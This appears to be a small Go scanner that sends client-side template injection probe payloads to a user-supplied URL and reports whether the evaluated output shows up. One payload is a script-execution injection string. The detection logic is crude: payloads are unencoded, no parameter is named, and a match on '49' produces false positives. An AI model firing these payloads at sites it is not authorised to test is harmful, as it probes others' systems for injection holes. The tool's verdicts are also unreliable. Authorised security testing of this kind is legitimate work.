package main

import (
    "bufio"
    "fmt"
    "net/http"
    "os"
    "strings"
)

// Function to check if the target website is vulnerable to CSTI
func isVulnerable(url string) bool {
    payloads := []string{"{{7*7}}", "{{7*'7'}}", "{{7+7}}", "{{7-3}}", "{{'7'|string}}", "{{7|float}}", "{{'x'.constructor('alert(1)')()}}", "{{7*undefined}}", "{{7*[1]}}", "{{7*[7]}}", "{{7*(7)}}", "{{7*{}}}"}

    for _, payload := range payloads {
        resp, err := http.Get(url + "?" + payload)
        if err != nil {
            fmt.Println("Error sending request to the target:", err)
            continue
        }
        defer resp.Body.Close()

        // Check if the response contains the evaluated payload
        scanner := bufio.NewScanner(resp.Body)
        for scanner.Scan() {
            if strings.Contains(scanner.Text(), "49") || strings.Contains(scanner.Text(), "alert(1)") {
                return true
            }
        }
    }

    return false
}

func main() {
    // Ask for the target website URL
    fmt.Println("\nEnter your target website URL (e.g., http://example.com):")
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := scanner.Text()

    // Check if the target is vulnerable to CSTI
    fmt.Println("\nTesting for Client-Side Template Injection vulnerability...")
    fmt.Println("This may take a moment.")

    if isVulnerable(targetURL) {
        fmt.Println("\nTarget website is potentially vulnerable to Client-Side Template Injection!")
        fmt.Println("\nTo test the vulnerability, try injecting payloads like '{{7*7}}', '{{7*'7'}}', '{{7+7}}', etc.")
    } else {
        fmt.Println("\nTarget website does not appear to be vulnerable to Client-Side Template Injection.")
    }
}
